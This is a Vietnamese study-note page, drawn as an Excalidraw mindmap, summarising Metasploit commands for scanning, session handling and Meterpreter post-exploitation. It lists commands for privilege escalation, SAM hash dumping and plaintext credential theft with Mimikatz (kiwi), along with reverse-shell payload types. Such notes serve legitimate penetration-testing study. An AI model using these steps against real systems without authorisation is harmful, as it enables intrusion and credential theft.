---
title: "tóm tắt các lệnh metasploit"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-1bf48d16">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1340 5909" width="1340" height="5909" class="excalidraw-svg" data-width="1340" data-height="5909">
<g transform="translate(98.59,25.19)">

<rect x="138.13368620948438" y="21.91697105079851" width="771.01650209275" height="757.9993403691061" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="138.13368620948438" y="21.91697105079851" width="771.01650209275" height="757.9993403691061" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">🌲 Msfconsole Commands (Tree)</span>
      </div>
      <a href="#doc-7897ea6841b5b73971fcd8d5ac2035484a812b2b" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <h3>🌲 Msfconsole Commands (Tree)</h3>
<p><strong>Tìm &amp; xem</strong></p>
<ul>
<li><code>search</code> → tìm module (kèm filter: <code>type</code>, <code>platform</code>, <code>cve</code>, <code>name</code>)</li>
<li><code>info</code> → chi tiết module</li>
</ul>
<p><strong>Chọn &amp; cấu hình</strong></p>
<ul>
<li><code>use &lt;module&gt;</code> → nạp module</li>
<li><code>show options</code> → xem tham số</li>
<li><code>show payloads</code> → xem payload tương thích</li>
<li><code>set</code> → gán tham số (cục bộ)</li>
<li><code>setg</code> → gán tham số (toàn cục)</li>
<li><code>set PAYLOAD</code> → chọn payload</li>
<li><code>unset</code> / <code>unset all</code> → xóa / reset</li>
</ul>
<p><strong>Chạy</strong></p>
<ul>
<li><code>check</code> → kiểm tra an toàn</li>
<li><code>exploit</code> / <code>run</code> → chạy module</li>
<li><code>exploit -z</code> → chạy &amp; background</li>
<li><code>back</code> → thoát module</li>
</ul>
<p><strong>Quản lý session</strong></p>
<ul>
<li><code>sessions</code> → liệt kê</li>
<li><code>sessions -i &lt;id&gt;</code> → tương tác</li>
<li><code>background</code> / <code>Ctrl+Z</code> → background</li>
<li><code>sessions -k &lt;id&gt;</code> → kill 1</li>
<li><code>sessions -K</code> → kill all</li>
</ul>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(98.59,25.19)">

<rect x="50.032009541477976" y="853.8796702110046" width="827.2463350186914" height="1105.5903959779218" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="50.032009541477976" y="853.8796702110046" width="827.2463350186914" height="1105.5903959779218" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📋 Cheatsheet: Metasploit Scanning &amp; Database</span>
      </div>
      <a href="#doc-e12c9e6514d9a9b9d5afc17438099f0cdd1a1603" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <h3>📋 Cheatsheet: Metasploit Scanning &amp; Database</h3>
<h4>Database &amp; Workspace</h4>
<ul>
<li><code>sudo msfdb init</code> → khởi tạo database</li>
<li><code>db_status</code> → kiểm tra kết nối DB</li>
<li><code>workspace</code> → xem workspace hiện tại</li>
<li><code>workspace -a &lt;tên&gt;</code> → tạo workspace mới</li>
<li><code>workspace &lt;tên&gt;</code> → chuyển workspace</li>
<li><code>workspace -d &lt;tên&gt;</code> → xóa workspace</li>
</ul>
<h4>Scan &amp; lưu vào DB</h4>
<ul>
<li><code>db_nmap -sV -O &lt;IP&gt;</code> → quét Nmap, lưu kết quả vào DB</li>
<li><code>db_import &lt;file.xml&gt;</code> → nhập kết quả scan ngoài</li>
<li><code>db_export</code> → xuất dữ liệu DB</li>
</ul>
<h4>Xem dữ liệu</h4>
<ul>
<li><code>hosts</code> → liệt kê host</li>
<li><code>services</code> → liệt kê dịch vụ/cổng</li>
<li><code>services -S &lt;tên&gt;</code> → lọc theo tên dịch vụ</li>
<li><code>creds</code> → xem credential thu thập</li>
<li><code>vulns</code> → xem lỗ hổng đã ghi nhận</li>
</ul>
<h4>Tự điền RHOSTS từ DB</h4>
<ul>
<li><code>hosts -R</code> → gán tất cả host vào RHOSTS</li>
<li><code>services -S &lt;tên&gt; -R</code> → gán host có dịch vụ cụ thể vào RHOSTS</li>
</ul>
<h4>Module Scanner thường dùng</h4>
<table>
<thead>
<tr>
<th>Mục đích</th>
<th>Module</th>
</tr>
</thead>
<tbody><tr>
<td>Quét cổng TCP</td>
<td><code>auxiliary/scanner/portscan/tcp</code></td>
</tr>
<tr>
<td>Check MS17-010</td>
<td><code>auxiliary/scanner/smb/smb_ms17_010</code></td>
</tr>
<tr>
<td>Brute SMB login</td>
<td><code>auxiliary/scanner/smb/smb_login</code></td>
</tr>
<tr>
<td>Check anonymous FTP</td>
<td><code>auxiliary/scanner/ftp/ftp_anonymous</code></td>
</tr>
<tr>
<td>Lấy tên máy (NetBIOS)</td>
<td><code>auxiliary/scanner/netbios/nbname</code></td>
</tr>
<tr>
<td>Lấy version web server</td>
<td><code>auxiliary/scanner/http/http_version</code></td>
</tr>
</tbody></table>
<blockquote>
<p>💡 <strong>Quy trình:</strong> <code>db_nmap</code> → xem <code>services</code> → <code>search type:auxiliary &lt;tên&gt;</code> → <code>use</code> → <code>set RHOSTS</code> (hoặc <code>services -R</code>) → <code>run</code> → <code>vulns</code> xem kết quả.</p>
</blockquote>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(98.59,25.19)">
<path d="M56.74 838.82 C204.31 837.56,350.81 837.48,568.41 838.47 M55.86 839.11 C235.10 840.80,414.55 840.56,568.63 838.68 M568.46 839.45 C568.74 856.06,568.77 870.17,569.35 913.12 M568.87 838.57 C568.23 863.60,568.13 888.87,568.32 913.87 M567.78 913.91 C407.69 913.50,247.21 912.65,56.56 913.10 M568.63 913.93 C367.03 913.24,166.52 912.81,56.50 913.74 M54.41 914.92 C55.47 892.31,54.67 868.12,54.68 838.37 M57.10 913.86 C56.75 898.43,57.03 882.36,57.01 839.84" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M145.71 15.85 C215.66 15.67,284.41 13.20,470.42 14.90 M145.80 15.33 C252.96 12.76,360.37 13.82,469.77 15.07 M469.14 14.33 C467.84 29.79,470.69 48.17,470.24 79.55 M468.89 13.95 C469.96 38.64,469.81 62.39,469.48 80.84 M468.77 80.67 C383.78 81.91,295.36 80.38,146.24 80.42 M469.89 80.20 C393.53 82.18,318.05 81.32,144.84 80.29 M146.89 79.55 C147.07 57.37,144.99 30.78,144.72 13.05 M145.28 79.97 C144.33 66.20,144.61 49.96,144.63 14.83" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">

<rect x="1.7760045032932794" y="2089.9862215456815" width="800" height="1620" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="1.7760045032932794" y="2089.9862215456815" width="800" height="1620" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📋 Cheatsheet: Meterpreter &amp; Post-Exploitation</span>
      </div>
      <a href="#doc-ece275b27e30610d36713d1b8046ec5935138280" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <h3>📋 Cheatsheet: Meterpreter &amp; Post-Exploitation</h3>
<h4>Kiến trúc Meterpreter</h4>
<ul>
<li><strong>In-Memory</strong>: Chạy trong RAM, không ghi file ra đĩa.</li>
<li><strong>Encrypted Communication</strong>: Traffic mã hóa (TLS/AES).</li>
<li><strong>Extensible</strong>: Dùng <code>load</code> để nạp thêm extension.</li>
</ul>
<h4>Chọn Meterpreter</h4>
<ul>
<li><strong>OS</strong>: <code>windows</code>, <code>linux</code>, <code>java</code>, <code>php</code>, <code>python</code>.</li>
<li><strong>Connection</strong>: <code>reverse_tcp</code>, <code>reverse_https</code>, <code>bind_tcp</code>.</li>
<li><strong>Staged vs Stageless</strong>: <code>/</code> = staged, <code>_</code> = stageless.</li>
</ul>
<hr>
<h4>Lệnh tình huống (Awareness)</h4>
<ul>
<li><code>sysinfo</code> – thông tin hệ thống</li>
<li><code>getuid</code> – user hiện tại</li>
<li><code>getpid</code> – PID hiện tại</li>
<li><code>ps</code> – liệt kê process</li>
<li><code>idletime</code> – thời gian người dùng rời máy</li>
</ul>
<h4>Lệnh file system</h4>
<ul>
<li><code>pwd</code>, <code>cd</code>, <code>ls</code> – điều hướng</li>
<li><code>cat</code> – đọc file</li>
<li><code>search -f &lt;pattern&gt; -d &lt;dir&gt;</code> – tìm file</li>
<li><code>download &lt;remote&gt; &lt;local&gt;</code> – tải file về</li>
<li><code>upload &lt;local&gt; &lt;remote&gt;</code> – đưa file lên</li>
</ul>
<h4>Lệnh mạng</h4>
<ul>
<li><code>ifconfig</code> – xem IP/interface</li>
<li><code>netstat</code> – xem kết nối</li>
</ul>
<h4>Lệnh OS</h4>
<ul>
<li><code>shell</code> – mở cmd/sh</li>
<li><code>execute -f &lt;cmd&gt; -i</code> – chạy lệnh</li>
</ul>
<hr>
<h4>Post-Exploitation</h4>
<ul>
<li><code>migrate &lt;PID&gt;</code> – chuyển process</li>
<li><code>getsystem</code> – leo lên SYSTEM</li>
<li><code>hashdump</code> – lấy hash SAM</li>
<li><code>load kiwi</code> – nạp Mimikatz</li>
<li><code>creds_all</code> – lấy mọi credential</li>
<li><code>background</code> – background session</li>
<li><code>use post/...</code> + <code>set SESSION &lt;id&gt;</code> + <code>run</code> – chạy post module</li>
</ul>
<hr>
<h4>Quy trình post module</h4>
<ol>
<li><code>background</code></li>
<li><code>use post/&lt;module&gt;</code></li>
<li><code>set SESSION &lt;id&gt;</code></li>
<li><code>run</code></li>
</ol>
<hr>
<h4>Ghi nhớ nhanh</h4>
<ul>
<li>Sau khi exploit, luôn chạy <code>sysinfo</code>, <code>getuid</code>, <code>getpid</code>.</li>
<li>Muốn leo quyền: <code>getsystem</code> → nếu fail, <code>migrate</code> sang process SYSTEM rồi thử lại.</li>
<li>Muốn lấy hash: <code>hashdump</code> (cần SYSTEM).</li>
<li>Muốn lấy mật khẩu plaintext: <code>load kiwi</code> + <code>creds_all</code>.</li>
<li>Luôn <code>help</code> để xem danh sách lệnh có sẵn.</li>
</ul>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(98.59,25.19)">
<path d="M1.65 2076.70 C223.21 2076.24,444.47 2075.16,561.27 2075.72 M1.58 2076.59 C114.10 2077.51,227.38 2077.89,560.88 2076.43 M560.94 2076.81 C561.01 2101.05,562.43 2128.77,562.71 2146.53 M561.30 2075.56 C560.40 2095.42,560.55 2114.36,559.95 2148.06 M560.21 2147.22 C392.06 2149.01,224.26 2149.50,1.69 2147.83 M561.01 2147.91 C415.09 2148.47,269.09 2148.67,1.17 2147.65 M1.17 2149.14 C-0.35 2132.89,2.72 2118.29,0.17 2075.89 M2.50 2148.76 C2.74 2120.04,1.79 2091.67,0.96 2076.75" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="-58.59" y="2117.15" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="-58.59" dy="0">III)</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<text x="-5.44" y="882.37" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="-5.44" dy="0">II)</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<text x="104.82" y="57.05" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="104.82" dy="0">I)</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M894.88 969.80 L895.48 970.61 L895.88 971.80 L896.15 972.84 L896.42 974.25 L896.82 977.08 L896.95 978.41 L897.35 981.16 L897.68 983.98 L898.15 986.73 L898.22 987.99 L898.48 990.07 L898.48 990.07" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="602.95" y="2132.66" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="602.95" dy="0">phần này chứa các câu</tspan><tspan x="602.95" dy="25">lệnh khi thao tác với</tspan><tspan x="602.95" dy="25">session meterpreter</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M661.71 2242.45 L661.42 2243.51 L659.99 2246.58 L658.90 2248.77 L657.87 2251.01 L657.41 2252.08 L656.49 2254.14 L655.75 2256.10 L655.35 2256.98 L654.83 2258.34 L654.43 2259.40 L654.08 2260.41 L654.54 2259.76 L655.52 2257.99 L656.43 2255.62 L657.52 2252.67 L658.67 2249.42 L659.76 2246.17 L660.73 2243.45 L661.59 2241.32 L662.28 2239.61 L662.91 2238.61 L663.65 2237.96 L664.51 2238.31 L664.97 2239.26 L665.49 2240.62 L666.06 2242.74 L666.40 2245.05 L666.69 2247.35 L666.75 2248.59 L666.81 2251.01 L666.75 2252.08 L666.69 2253.85 L666.58 2255.21 L666.40 2256.27 L666.40 2256.27" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M656.55 2244.40 L657.75 2244.75 L658.55 2245.05 L660.56 2245.82 L662.57 2246.23 L664.80 2246.52 L664.80 2246.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M679.24 2235.47 L678.38 2235.83 L677.69 2238.61 L677.29 2240.97 L677.01 2243.39 L676.66 2245.82 L676.38 2248.24 L676.20 2249.42 L675.92 2251.60 L675.75 2252.49 L675.46 2253.91 L675.11 2254.97 L674.77 2255.92 L674.77 2255.92" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M669.44 2248.59 L672.42 2247.88 L675.00 2247.53 L677.69 2247.29 L680.44 2247.00 L683.08 2246.82 L684.23 2246.64 L686.06 2246.52 L687.38 2246.35 L688.41 2246.23 L689.21 2245.93 L687.38 2246.52 L686.52 2246.94 L684.86 2248.00 L683.37 2249.24 L682.16 2250.42 L680.84 2252.31 L680.50 2253.26 L680.90 2254.14 L682.22 2254.14 L684.68 2252.84 L686.17 2251.72 L686.75 2251.25 L687.78 2250.30 L688.47 2249.59 L689.15 2248.77 L689.67 2248.24 L689.55 2249.42 L689.78 2250.48 L690.07 2251.31 L690.64 2252.08 L691.22 2252.73 L691.79 2253.26 L692.59 2253.55 L692.59 2253.55" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M700.96 2251.84 L700.79 2250.78 L700.04 2250.24 L698.78 2250.24 L697.86 2250.42 L696.03 2251.66 L694.94 2252.67 L694.25 2253.67 L693.85 2254.56 L693.85 2255.68 L694.31 2256.63 L695.17 2257.16 L696.55 2257.16 L696.55 2257.16" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M711.33 2238.72 L711.10 2239.91 L710.87 2240.91 L710.59 2242.80 L710.01 2245.05 L709.50 2247.23 L708.92 2249.30 L708.69 2250.30 L708.35 2251.96 L708.12 2253.26 L707.89 2254.38 L707.66 2255.62 L707.55 2256.63 L707.55 2256.63" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M713.74 2251.49 L712.59 2251.07 L711.62 2250.78 L710.64 2250.60 L709.78 2251.07 L709.67 2252.14 L710.13 2253.02 L711.39 2254.38 L713.05 2255.44 L713.85 2255.86 L715.51 2256.45 L716.83 2256.80 L718.03 2256.86 L718.03 2256.86" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M725.88 2259.64 L726.52 2258.93 L726.74 2257.87 L726.74 2256.51 L726.52 2255.44 L726.11 2254.44 L725.66 2253.73 L724.91 2253.26 L724.05 2253.73 L723.76 2254.50 L723.88 2255.62 L724.34 2256.27 L725.14 2256.69 L726.23 2256.86 L727.37 2256.51 L728.06 2255.86 L728.69 2255.09 L729.15 2254.26 L729.67 2253.44 L730.13 2252.73 L731.21 2252.84 L732.07 2253.26 L734.14 2254.44 L735.74 2255.44 L736.54 2255.86 L737.23 2256.33 L738.38 2257.16 L739.24 2257.87 L740.61 2259.05 L741.13 2259.64 L742.79 2260.65 L742.79 2260.65" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M891.72 2242.33 L891.78 2243.39 L891.89 2244.75 L891.95 2247.23 L892.12 2249.77 L892.18 2252.49 L892.23 2253.79 L892.35 2256.51 L892.35 2259.05 L892.23 2261.35 L892.18 2263.01 L892.18 2263.01" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M881.58 2241.74 L881.63 2240.67 L882.15 2239.97 L884.04 2238.96 L886.28 2238.37 L888.80 2238.25 L891.55 2238.67 L894.58 2239.61 L896.25 2240.20 L897.79 2240.79 L897.79 2240.79" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M913.26 2251.07 L912.29 2250.95 L910.97 2250.84 L909.77 2251.07 L908.97 2251.43 L907.42 2252.43 L906.45 2253.38 L905.64 2254.20 L905.19 2254.97 L904.90 2255.92 L905.13 2256.86 L906.22 2256.57 L907.76 2254.97 L908.28 2254.20 L909.20 2252.79 L909.77 2251.60 L910.23 2250.66 L910.57 2249.65 L910.92 2250.66 L910.97 2251.96 L911.20 2253.08 L911.66 2254.44 L912.00 2255.27 L912.00 2255.27" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M917.62 2258.87 L917.39 2257.99 L917.73 2257.04 L918.36 2255.50 L919.00 2253.49 L919.51 2251.43 L919.68 2250.48 L919.91 2249.00 L920.08 2247.88 L920.14 2246.58 L920.08 2245.52 L919.97 2246.64 L920.20 2247.65 L920.83 2249.77 L921.52 2251.72 L922.15 2253.55 L922.43 2254.38 L923.35 2256.63 L923.87 2257.34 L923.87 2257.34" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M932.98 2248.53 L931.83 2248.59 L930.86 2249.18 L929.77 2250.42 L929.37 2251.13 L928.79 2252.37 L928.56 2253.38 L928.45 2254.50 L928.85 2255.44 L929.94 2255.27 L930.46 2254.56 L930.86 2253.67 L931.26 2252.55 L931.60 2251.72 L932.06 2250.95 L932.86 2251.49 L933.61 2253.44 L934.01 2255.15 L934.29 2256.57 L934.47 2257.87 L934.64 2258.93 L934.70 2260.11 L934.75 2261.12 L934.41 2262.06 L933.55 2262.36 L932.29 2262.18 L931.37 2261.89 L931.83 2261.29 L933.15 2260.29 L934.93 2259.05 L936.70 2257.69 L938.31 2256.33 L939.85 2254.91 L941.17 2253.38 L941.80 2252.55 L942.78 2250.60 L943.12 2249.54 L943.23 2248.24 L943.12 2247.17 L942.26 2247.53 L942.09 2248.71 L942.15 2249.77 L942.49 2251.25 L942.95 2253.08 L943.46 2254.50 L943.92 2255.56 L944.38 2256.51 L944.78 2257.22 L945.35 2257.93 L946.27 2258.22 L947.07 2257.75 L947.82 2257.28 L948.39 2256.80 L949.02 2256.27 L949.65 2255.80 L950.28 2255.27 L950.63 2254.56 L950.63 2254.56" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M952.63 2255.62 L952.57 2256.86 L952.52 2258.16 L952.57 2259.23 L952.57 2259.23" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M953.72 2252.02 L954.52 2251.60 L954.52 2251.60" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M754.36 2245.11 L755.57 2244.52 L759.46 2243.16 L763.88 2241.86 L770.12 2240.44 L777.74 2239.02 L786.11 2237.96 L794.65 2237.36 L798.89 2237.31 L806.28 2237.48 L813.21 2238.01 L819.80 2238.90 L825.71 2239.97 L833.79 2242.03 L838.60 2243.45 L842.55 2244.69 L846.28 2245.93 L848.05 2246.52 L851.21 2247.70 L853.73 2248.65 L855.96 2249.42 L857.91 2250.13 L858.77 2250.42 L859.97 2250.78 L861.00 2251.01 L862.15 2251.07 L862.15 2251.07" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M860.89 2237.25 L861.92 2237.60 L862.78 2238.19 L863.53 2238.96 L864.67 2240.44 L865.07 2241.15 L865.36 2242.62 L865.13 2244.28 L864.21 2246.58 L862.38 2249.18 L859.46 2252.02 L855.73 2254.85 L855.73 2254.85" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M750.75 2267.91 L751.16 2268.80 L753.10 2269.80 L755.85 2271.16 L759.81 2272.82 L764.51 2274.59 L769.78 2276.24 L775.62 2277.72 L779.12 2278.55 L786.45 2279.96 L797.74 2281.68 L805.08 2282.39 L812.30 2282.80 L819.69 2282.86 L826.97 2282.74 L833.96 2282.21 L840.60 2281.50 L843.58 2281.14 L849.37 2280.32 L854.07 2279.37 L858.08 2278.43 L861.35 2277.54 L863.98 2276.60 L867.25 2275.00 L868.91 2274.06 L869.54 2273.52 L870.52 2272.76 L870.52 2272.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M749.44 2292.02 L749.61 2292.96 L750.41 2294.85 L751.44 2296.92 L753.10 2299.11 L755.34 2301.53 L758.03 2303.95 L761.53 2306.61 L763.48 2307.91 L767.66 2310.39 L772.19 2312.64 L777.17 2314.64 L782.79 2316.12 L792.30 2317.72 L799.06 2318.31 L805.94 2318.37 L812.87 2318.01 L820.09 2317.25 L823.87 2316.71 L831.21 2315.35 L837.34 2314.05 L843.18 2312.52 L848.57 2310.80 L853.61 2308.97 L858.08 2306.96 L863.47 2304.19 L866.22 2302.30 L867.48 2301.47 L869.31 2299.87 L870.75 2298.46 L871.49 2297.33 L871.49 2297.33" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M762.50 2329.71 L762.62 2330.60 L762.79 2331.54 L763.65 2334.03 L764.79 2336.27 L766.63 2338.75 L768.86 2341.29 L771.73 2343.65 L773.68 2344.95 L777.80 2347.20 L782.79 2349.15 L788.57 2350.45 L798.54 2351.16 L805.99 2350.57 L814.19 2349.27 L822.27 2347.73 L830.00 2345.78 L837.28 2343.71 L840.66 2342.59 L847.19 2340.17 L853.44 2337.39 L859.23 2334.32 L864.33 2331.07 L868.40 2327.82 L873.44 2322.80 L875.96 2319.43 L877.68 2316.42 L878.31 2315.06 L879.00 2312.81 L879.23 2311.75 L879.40 2310.15 L879.40 2310.15" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M857.17 2212.67 L857.62 2212.02 L856.59 2213.79 L855.45 2215.68 L854.07 2217.81 L852.58 2220.17 L851.26 2222.36 L850.06 2224.49 L848.97 2226.44 L848.51 2227.26 L847.83 2228.62 L847.37 2229.69 L846.91 2230.40 L846.91 2230.40" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M844.67 2224.07 L843.64 2224.37 L843.13 2226.08 L842.44 2227.97 L842.21 2228.86 L841.87 2230.40 L841.75 2231.69 L841.75 2232.82 L841.87 2233.82 L842.27 2234.53 L842.90 2235.06 L843.99 2235.24 L845.53 2234.82 L847.65 2233.70 L848.80 2232.76 L849.89 2231.75 L849.89 2231.75" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M867.48 2184.37 L867.25 2183.37 L866.91 2184.31 L866.39 2187.38 L865.99 2189.63 L865.70 2191.87 L865.53 2192.99 L865.30 2194.83 L865.13 2196.36 L865.02 2197.55 L864.84 2198.49 L864.79 2199.55 L864.90 2197.84 L865.13 2195.18 L865.53 2192.64 L865.93 2190.16 L866.56 2187.03 L866.91 2185.49 L867.25 2184.43 L867.59 2183.66 L868.22 2183.13 L869.26 2183.66 L870.46 2185.73 L871.32 2187.74 L872.18 2189.80 L872.98 2191.87 L873.78 2193.70 L874.07 2194.47 L874.64 2195.83 L874.99 2196.78 L875.39 2197.55 L875.85 2198.25 L876.76 2197.90 L877.85 2196.24 L879.17 2192.76 L879.57 2191.34 L880.72 2187.38 L881.35 2184.96 L881.86 2182.77 L882.09 2181.95 L882.09 2181.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M885.82 2172.14 L885.64 2173.38 L884.96 2176.81 L884.33 2179.41 L883.81 2182.18 L883.41 2183.54 L882.95 2186.38 L882.38 2189.15 L882.03 2191.64 L881.81 2193.94 L881.63 2194.94 L881.58 2196.36 L881.40 2197.49 L881.40 2198.61 L882.95 2197.55 L883.87 2195.77 L884.79 2194.06 L885.59 2192.58 L886.16 2191.34 L886.62 2190.51 L887.02 2189.80 L887.31 2188.98 L887.54 2189.86 L887.71 2190.99 L888.05 2192.05 L888.51 2192.76 L889.66 2192.70 L890.40 2192.11 L891.26 2191.28 L891.78 2190.69 L892.58 2189.80 L893.21 2189.09 L893.72 2188.27 L894.13 2187.56 L893.95 2188.50 L894.01 2189.51 L894.18 2190.63 L894.81 2192.99 L895.27 2194.41 L896.36 2196.19 L897.05 2196.60 L898.14 2196.78 L899.05 2196.42 L900.66 2194.77 L901.12 2193.94 L901.75 2192.52 L901.98 2191.22 L902.21 2190.22 L902.21 2189.09 L901.80 2188.27 L900.89 2188.50 L900.37 2189.15 L899.40 2191.16 L899.11 2192.64 L898.94 2193.94 L899.05 2195.00 L899.28 2195.89 L899.74 2196.60 L900.37 2197.13 L901.35 2197.55 L902.84 2197.49 L903.87 2197.13 L905.59 2196.42 L906.67 2195.71 L907.36 2195.00 L907.88 2194.35 L908.34 2193.70 L907.76 2194.35 L907.42 2195.36 L907.36 2196.36 L907.59 2197.19 L908.28 2197.60 L909.54 2197.43 L910.28 2197.01 L910.97 2196.48 L911.77 2196.84 L911.83 2197.96 L911.89 2198.96 L911.89 2198.96" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M903.18 2180.94 L904.21 2181.12 L904.90 2181.59 L905.64 2182.30 L906.45 2182.89 L907.53 2183.78 L907.53 2183.78" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M911.37 2177.87 L911.43 2176.86 L912.52 2177.04 L914.24 2178.40 L914.98 2179.05 L914.98 2179.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
